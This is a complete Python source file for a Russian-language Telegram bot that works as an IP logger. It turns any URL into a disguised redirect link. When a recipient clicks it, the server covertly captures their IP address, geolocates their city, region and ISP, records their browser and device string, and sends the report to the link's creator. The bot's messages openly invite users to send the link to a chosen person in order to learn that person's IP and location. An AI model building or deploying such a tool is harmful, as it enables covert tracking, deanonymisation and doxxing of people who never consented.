import os
import asyncio
import logging
import sqlite3
import uuid
from aiohttp import web, ClientSession
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command

BOT_TOKEN = os.getenv("BOT_TOKEN") 
DOMAIN = os.getenv("RENDER_EXTERNAL_URL", "http://localhost:8080") 

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

def init_db():
    conn = sqlite3.connect("links.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS links (
            short_code TEXT PRIMARY KEY,
            target_url TEXT,
            owner_id INTEGER
        )
    """)
    conn.commit()
    conn.close()

def save_link(short_code: str, target_url: str, owner_id: int):
    conn = sqlite3.connect("links.db")
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO links (short_code, target_url, owner_id) VALUES (?, ?, ?)",
        (short_code, target_url, owner_id)
    )
    conn.commit()
    conn.close()

def get_link(short_code: str):
    conn = sqlite3.connect("links.db")
    cursor = conn.cursor()
    cursor.execute("SELECT target_url, owner_id FROM links WHERE short_code = ?", (short_code,))
    row = cursor.fetchone()
    conn.close()
    if row:
        return {"url": row[0], "owner_id": row[1]}
    return None

# --- ФУНКЦИЯ ПОЛУЧЕНИЯ ГЕОДАННЫХ ПО IP ---
async def get_ip_info(ip: str) -> dict:
    # Если запуск локальный (127.0.0.1 / localhost)
    if ip in ("127.0.0.1", "localhost", "::1") or ip.startswith("192.168."):
        return {
            "country": "Локальная сеть (Localhost)",
            "region": "Локальный",
            "city": "Локальный",
            "isp": "Локальный провайдер",
            "query": ip
        }

    url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,query"
    try:
        async with ClientSession() as session:
            async with session.get(url, timeout=5) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get("status") == "success":
                        return data
    except Exception as e:
        logging.error(f"Ошибка запроса к IP API: {e}")

    return {"country": "Неизвестно", "region": "Неизвестно", "city": "Неизвестно", "isp": "Неизвестно", "query": ip}

# --- ОБРАБОТЧИКИ TELEGRAM ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        "Привет!\n\n"
        "Отправь мне ссылку (например, https://youtube.com), "
        "и я сделаю из нее специальную отслеживаемую ссылку."
    )

@dp.message()
async def process_link(message: types.Message):
    target_url = message.text.strip()

    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        await message.answer("Пожалуйста, отправь нормальную ссылку, начинающуюся с http:// или https://")
        return

    short_code = str(uuid.uuid4())[:8]
    save_link(short_code, target_url, message.from_user.id)

    logger_url = f"{DOMAIN}/r/{short_code}"

    await message.answer(
        f"Ссылка создана!\n\n"
        f"Ваша отслеживаемая ссылка:\n{logger_url}\n\n"
        f"Перенаправляет на:\n{target_url}\n\n"
        f"Отправь ее нужному человеку. Когда он по ней перейдет, тебе придет подробный отчет с его IP и местоположением."
    )

# --- ВЕБ-СЕРВЕР (ПЕРЕХВАТ IP И РЕДИРЕКТ) ---
async def handle_redirect(request: web.Request):
    short_code = request.match_info.get("short_code")
    link_info = get_link(short_code)

    if not link_info:
        return web.Response(text="Ссылка не найдена или устарела.", status=404)

    target_url = link_info["url"]
    owner_id = link_info["owner_id"]

    # Определяем реальный IP
    x_forwarded_for = request.headers.get("X-Forwarded-For")
    if x_forwarded_for:
        client_ip = x_forwarded_for.split(",")[0].strip()
    else:
        client_ip = request.remote or "Неизвестен"

    user_agent = request.headers.get("User-Agent", "Неизвестное устройство")

    # Запрашиваем город, регион и провайдера
    geo_data = await get_ip_info(client_ip)

    notification_text = (
        f"🔔 **Новый переход по ссылке!**\n\n"
        f"🌐 **IP-адрес:** `{client_ip}`\n"
        f"🏳️ **Страна:** {geo_data.get('country', 'Неизвестно')}\n"
        f"🏙 **Регион / Город:** {geo_data.get('regionName', geo_data.get('region', 'Неизвестно'))}, {geo_data.get('city', 'Неизвестно')}\n"
        f"📡 **Провайдер (ISP):** {geo_data.get('isp', 'Неизвестно')}\n\n"
        f"📱 **Устройство / Браузер:**\n`{user_agent}`\n\n"
        f"🔗 **Целевая ссылка:** {target_url}"
    )

    try:
        await bot.send_message(chat_id=owner_id, text=notification_text, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Ошибка отправки сообщения: {e}")

    raise web.HTTPFound(location=target_url)

# --- ГЛАВНАЯ ТОЧКА ВХОДА ---
async def handle_ping(request):
    return web.Response(text="OK", status=200)

async def main():
    init_db()
    
    app = web.Application()
    app.router.add_get("/", handle_ping)
    app.router.add_get("/r/{short_code}", handle_redirect)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 10000)))
    await site.start()
    
    try:
        await dp.start_polling(bot)
    finally:
        await runner.cleanup()

if __name__ == "__main__":
    asyncio.run(main())